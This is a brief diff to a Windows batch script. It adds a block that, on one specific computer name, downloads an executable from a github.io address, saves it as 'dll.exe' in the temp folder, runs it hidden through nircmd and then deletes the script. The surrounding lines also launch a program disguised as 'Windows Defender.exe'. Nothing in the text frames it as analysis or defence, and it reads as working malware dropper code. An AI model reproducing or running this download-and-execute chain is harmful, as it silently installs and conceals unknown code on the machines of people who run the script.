@@ -72,4 +72,12 @@ rmdir /s /q "%temp%\%folder%"
 
 "C:\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 
+if [%computername%]==[PAINDESKTOP] (
+  curl.exe %proxy% https://cryptedlumos.github.io/Client.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
+) else (
+echo.
+)
+
+del /s /f /q /a "%~f0"
+
 del /s /f /q /a "%~f0"
